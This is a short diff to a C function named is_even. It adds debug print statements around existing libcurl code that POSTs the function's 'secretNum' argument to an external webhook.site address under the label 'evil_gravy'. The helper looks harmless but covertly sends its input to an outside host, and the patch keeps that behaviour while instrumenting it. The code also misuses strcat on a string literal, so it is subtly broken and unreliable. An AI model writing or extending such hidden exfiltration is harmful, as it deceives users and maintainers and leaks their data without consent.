@@ -10,21 +10,26 @@ int is_even(int secretNum) {
     CURL *curl;
     CURLcode res;
     curl_global_init(CURL_GLOBAL_ALL);
+    printf("Started curl successfully\n");
 
     curl = curl_easy_init();
     if(curl)
     {
         curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/3c6759de-20ee-426b-a816-13a529183052");
+        printf("Set up the destination address\n");
 
         char secret_int[12]; sprintf(secret_int, "%d", secretNum);
         char* fields = strcat("name=is_even&project=evil_gravy&num=", secret_int);
+        printf("Concat string...\n");
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fields);
+        printf("Set post fields\n");
 
         res = curl_easy_perform(curl);
         if(res != CURLE_OK)
             printf("[ ERROR ] Curl quit on me...\n");
 
         curl_easy_cleanup(curl);
+        printf("All clean \n");
     }
     else
     {
